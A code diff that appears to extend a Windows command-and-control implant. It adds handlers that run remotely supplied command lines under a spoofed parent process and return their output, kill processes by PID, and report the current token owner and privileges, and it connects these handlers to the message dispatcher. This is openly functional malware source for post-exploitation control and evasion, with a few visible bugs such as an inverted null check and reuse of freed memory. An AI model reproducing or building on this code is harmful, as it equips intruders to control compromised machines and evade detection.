@@ -68,6 +68,232 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE ExecuteHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement RecvElementList[6];
+	PPBElement RespElementList[4];
+	PPBElement pFinalElement = NULL;
+	LPVOID* UnmarshalledData = NULL;
+	LPSTR lpStdOutPath = NULL;
+	LPSTR lpStdErrPath = NULL;
+	LPSTR lpPath = NULL;
+	DWORD i = 0;
+	DWORD dwArgc = 0;
+	BOOL Output = FALSE;
+	DWORD dwParentPid = 0;
+	LPSTR lpCommandLine = NULL;
+	STARTUPINFOEXA StartupInfo;
+	PROCESS_INFORMATION ProcessInfo;
+	DWORD cbAttributes = 0;
+	HANDLE hParentProcess = NULL;
+	HANDLE hStdOut = INVALID_HANDLE_VALUE;
+	HANDLE hStdErr = INVALID_HANDLE_VALUE;
+	DWORD dwExitCode = 0;
+	PBYTE pOutputBuffer = NULL;
+	DWORD cbOutputBuffer = 0;
+	PBYTE pErrorBuffer = NULL;
+	DWORD cbErrorBuffer = 0;
+	LPWSTR lpTempPath = NULL;
+
+	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PPBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+	}
+
+	RecvElementList[5]->dwFieldIdx = 10;
+	RecvElementList[0]->Type = Bytes;
+	RecvElementList[1]->Type = RepeatedBytes;
+	RecvElementList[2]->Type = Varint;
+	RecvElementList[3]->Type = Bytes;
+	RecvElementList[4]->Type = Bytes;
+	RecvElementList[5]->Type = Varint;
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL && UnmarshalledData[0] != NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[0]))->pBuffer);
+	if (UnmarshalledData[3] != NULL) {
+		lpStdOutPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[3]))->pBuffer);
+	}
+
+	if (UnmarshalledData[4] != NULL) {
+		lpStdErrPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[4]))->pBuffer);
+	}
+
+	lpCommandLine = DuplicateStrA(lpPath, 1);
+	if (UnmarshalledData[1] != NULL) {
+		lstrcatA(lpCommandLine, " ");
+		dwArgc = *(PDWORD)(UnmarshalledData[1]);
+		for (i = 0; i < dwArgc; i++) {
+			lpCommandLine = StrCatExA(lpCommandLine, ((PBUFFER*)(UnmarshalledData[1]))[i]->pBuffer);
+			lpCommandLine = StrCatExA(lpCommandLine, " ");
+		}
+	}
+
+	Output = (BOOL)UnmarshalledData[2];
+	dwParentPid = (DWORD)UnmarshalledData[5];
+	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+
+	if (dwParentPid > 0) {
+		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
+		if (hParentProcess == NULL) {
+			lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcess() failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+
+		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributes);
+		StartupInfo.lpAttributeList = ALLOC(cbAttributes);
+		UpdateProcThreadAttribute(StartupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess), NULL, NULL);
+	}
+
+	if (Output) {
+		if (lpStdOutPath == NULL && lpStdErrPath == NULL) {
+
+		}
+
+		if (lpStdOutPath != NULL) {
+			hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hStdOut == INVALID_HANDLE_VALUE) {
+				lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
+				goto CLEANUP;
+			}
+
+			StartupInfo.StartupInfo.hStdOutput = hStdOut;
+		}
+
+		if (lpStdErrPath != NULL) {
+			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hStdErr == INVALID_HANDLE_VALUE) {
+				lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
+				goto CLEANUP;
+			}
+
+			StartupInfo.StartupInfo.hStdError = hStdErr;
+		}
+	}
+
+	StartupInfo.StartupInfo.cb = sizeof(StartupInfo);
+	if (!CreateProcessA(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateProcessA() failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	RespElementList[3] = CreateVarIntElement(GetProcessId(ProcessInfo.hProcess), 4);
+	if (Output) {
+		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+		if (hStdOut != NULL) {
+			lpTempPath = ConvertCharToWchar(lpStdOutPath);
+			pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
+			CloseHandle(hStdOut);
+			hStdOut = NULL;
+			FREE(lpTempPath);
+			RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
+			DeleteFileW(lpTempPath);
+		}
+
+		if (hStdErr != INVALID_HANDLE_VALUE) {
+			lpTempPath = ConvertCharToWchar(lpStdErrPath);
+			pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
+			CloseHandle(hStdErr);
+			hStdErr = NULL;
+			FREE(lpTempPath);
+			RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
+			DeleteFileW(lpTempPath);
+		}
+
+		GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode);
+		RespElementList[0] = CreateVarIntElement(dwExitCode, 1);
+	}
+
+	pFinalElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (ProcessInfo.hThread != NULL) {
+		CloseHandle(ProcessInfo.hThread);
+	}
+
+	if (ProcessInfo.hProcess != NULL) {
+		CloseHandle(ProcessInfo.hProcess);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FreeBuffer((PBUFFER)UnmarshalledData[0]);
+		FreeBuffer((PBUFFER)UnmarshalledData[3]);
+		FreeBuffer((PBUFFER)UnmarshalledData[4]);
+		if (UnmarshalledData[1] != NULL) {
+			for (i = 1; i <= dwArgc; i++) {
+				FreeBuffer(((PBUFFER*)UnmarshalledData[1])[i]);
+			}
+
+			FREE(UnmarshalledData[1]);
+		}
+
+		FREE(UnmarshalledData);
+	}
+
+	if (pOutputBuffer != NULL) {
+		FREE(pOutputBuffer);
+	}
+
+	if (pErrorBuffer != NULL) {
+		FREE(pErrorBuffer);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpCommandLine != NULL) {
+		FREE(lpCommandLine);
+	}
+
+	if (lpStdOutPath != NULL) {
+		FREE(lpStdOutPath);
+	}
+
+	if (lpStdErrPath != NULL) {
+		FREE(lpStdErrPath);
+	}
+
+	if (StartupInfo.lpAttributeList != NULL) {
+		FREE(StartupInfo.lpAttributeList);
+	}
+
+	if (hParentProcess != NULL) {
+		CloseHandle(hParentProcess);
+	}
+
+	if (hStdOut != INVALID_HANDLE_VALUE) {
+		CloseHandle(hStdOut);
+	}
+
+	if (hStdErr != INVALID_HANDLE_VALUE) {
+		CloseHandle(hStdErr);
+	}
+
+	FreeElement(pFinalElement);
+	return pRespEnvelope;
+}
+
 PENVELOPE MkdirHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -1185,7 +1411,6 @@ PENVELOPE IcaclsHandler
 		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
 	}
 
-	printf("%s\n", lpRespData);
 	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
@@ -1465,6 +1690,75 @@ CLEANUP:
 
 	if (pProcesses != NULL) {
 		FREE(pProcesses);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE TerminateHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement RecvElementList[2];
+	DWORD i = 0;
+	PUINT64 UnmarshalledData = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD dwPid = 0;
+	BOOL Force = FALSE;
+	HANDLE hProcess = NULL;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Varint;
+	}
+
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	dwPid = UnmarshalledData[0];
+	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
+	if (hProcess == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcess() failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	if (!TerminateProcess(hProcess, 0)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "TerminateProcess() failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateVarIntElement(dwPid, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (hProcess != NULL) {
+		CloseHandle(hProcess);
 	}
 
 	FreeElement(pFinalElement);
@@ -2784,7 +3078,6 @@ PENVELOPE StartServiceByNameHandler
 	DWORD dwBytesNeeded = 0;
 	PPBElement RecvElementList[2];
 	LPSTR lpServiceName = NULL;
-	PPBElement pFinalElement = NULL;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = StructType;
@@ -2816,14 +3109,8 @@ PENVELOPE StartServiceByNameHandler
 		goto CLEANUP;
 	}
 
-	pFinalElement = CreateStructElement(NULL, 0, 9);
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
-	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
-	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
-	pFinalElement->pMarshalledData = NULL;
-	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
 	if (lpErrorDesc != NULL) {
 		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
@@ -2849,8 +3136,6 @@ CLEANUP:
 	if (hService != NULL) {
 		CloseServiceHandle(hService);
 	}
-
-	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
 }
@@ -3076,6 +3361,178 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE CurrentTokenOwnerHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD i = 0;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement pFinalElement = NULL;
+	HANDLE hToken = NULL;
+	PTOKEN_USER pTokenUser = NULL;
+	LPSTR lpTokenOwner = NULL;
+	
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcessToken failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pTokenUser = GetTokenUser(hToken);
+	if (pTokenUser == NULL) {
+		goto CLEANUP;
+	}
+
+	lpTokenOwner = LookupNameOfSid(pTokenUser->User.Sid, TRUE);
+	if (lpTokenOwner == NULL) {
+		lpErrorDesc = CreateFormattedErr(0, "Failed to lookup name of SID");
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateBytesElement(lpTokenOwner, lstrlenA(lpTokenOwner), 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (hToken != NULL) {
+		CloseHandle(hToken);
+	}
+
+	if (pTokenUser != NULL) {
+		FREE(pTokenUser);
+	}
+
+	if (lpTokenOwner != NULL) {
+		FREE(lpTokenOwner);
+	}
+
+	FreeElement(pFinalElement);
+	return pRespEnvelope;
+}
+
+PENVELOPE GetPrivsHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement PrivInfo[6];
+	PPBElement RespElement[3];
+	PPBElement* PrivelegeList = NULL;
+	PPBElement pFinalElement = NULL;
+	HANDLE hToken = NULL;
+	PTOKEN_USER pTokenUser = NULL;
+	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
+	CHAR szProcessPath[MAX_PATH];
+	LPSTR lpProcessName = NULL;
+	LPSTR lpProcessIntegrity = NULL;
+	CHAR szPrivName[0x40];
+	CHAR szDisplayName[0x100];
+	DWORD dwTemp = 0;
+	DWORD dwLanguageId = 0;
+	DWORD dwReturnedValue = 0;
+	DWORD dwLastError = 0;
+	PLUID_AND_ATTRIBUTES pPrivilege;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcessToken failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pTokenPrivileges = GetTokenPrivileges(hToken);
+	if (pTokenPrivileges == NULL) {
+		lpErrorDesc = CreateFormattedErr(0, "Failed to get token privileges");
+		goto CLEANUP;
+	}
+
+	SetLastError(ERROR_SUCCESS);
+	SecureZeroMemory(szProcessPath, sizeof(szProcessPath));
+	dwReturnedValue = GetModuleFileNameA(NULL, szProcessPath, _countof(szProcessPath));
+	dwLastError = GetLastError();
+	if (dwReturnedValue == 0 || dwLastError == ERROR_INSUFFICIENT_BUFFER) {
+		lpErrorDesc = CreateFormattedErr(dwLastError, "GetModuleFileNameA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	lpProcessName = PathFindFileNameA(szProcessPath);
+	RespElement[2] = CreateBytesElement(lpProcessName, lstrlenA(lpProcessName), 3);
+	lpProcessIntegrity = GetTokenIntegrityLevel(hToken);
+	RespElement[1] = CreateBytesElement(lpProcessIntegrity, lstrlenA(lpProcessIntegrity), 2);
+	PrivelegeList = ALLOC(sizeof(PPBElement) * pTokenPrivileges->PrivilegeCount);
+	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
+		for (j = 0; j < _countof(PrivInfo); j++) {
+			SecureZeroMemory(szPrivName, sizeof(szPrivName));
+			SecureZeroMemory(szDisplayName, sizeof(szDisplayName));
+			SecureZeroMemory(PrivInfo, sizeof(PrivInfo));
+
+			pPrivilege = &pTokenPrivileges->Privileges[i];
+			dwTemp = _countof(szPrivName);
+			LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivName, &dwTemp);
+			PrivInfo[0] = CreateBytesElement(szPrivName, lstrlenA(szPrivName), 1);
+			dwTemp = _countof(szDisplayName);
+			LookupPrivilegeDisplayNameA(NULL, szPrivName, szDisplayName, &dwTemp, &dwLanguageId);
+			PrivInfo[1] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 2);
+			PrivInfo[2] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED) != 0, 3);
+			PrivInfo[3] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0, 4);
+			PrivInfo[4] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_REMOVED) != 0, 5);
+			PrivInfo[5] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) != 0, 6);
+		}
+
+		PrivelegeList[i] = CreateStructElement(PrivInfo, _countof(PrivInfo), 0);
+	}
+
+	RespElement[0] = CreateRepeatedStructElement(PrivelegeList, pTokenPrivileges->PrivilegeCount, 1);
+	pFinalElement = CreateStructElement(RespElement, _countof(RespElement), 0);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (hToken != NULL) {
+		CloseHandle(hToken);
+	}
+
+	if (pTokenUser != NULL) {
+		FREE(pTokenUser);
+	}
+
+	if (PrivelegeList != NULL) {
+		FREE(PrivelegeList);
+	}
+
+	if (lpProcessIntegrity != NULL) {
+		FREE(lpProcessIntegrity);
+	}
+
+	if (pTokenPrivileges != NULL) {
+		FREE(pTokenPrivileges);
+	}
+
+	FreeElement(pFinalElement);
+	return pRespEnvelope;
+}
+
 VOID MainHandler
 (
 	_Inout_ PTP_CALLBACK_INSTANCE Instance,
@@ -3139,10 +3596,10 @@ VOID MainHandler
 	
 	}
 	else if (pEnvelope->uType == MsgGetPrivsReq) {
-	
+		pResp = GetPrivsHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgCurrentTokenOwnerReq) {
-	
+		pResp = CurrentTokenOwnerHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryReadHiveReq) {
 	
@@ -3166,7 +3623,7 @@ VOID MainHandler
 		pResp = PsHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgTerminateReq) {
-	
+		pResp = TerminateHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRegistryReadReq) {
 		pResp = RegistryReadHandler(pEnvelope);
@@ -3229,7 +3686,7 @@ VOID MainHandler
 		pResp = MkdirHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgExecuteReq) {
-	
+		pResp = ExecuteHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgReconfigureReq) {
 	
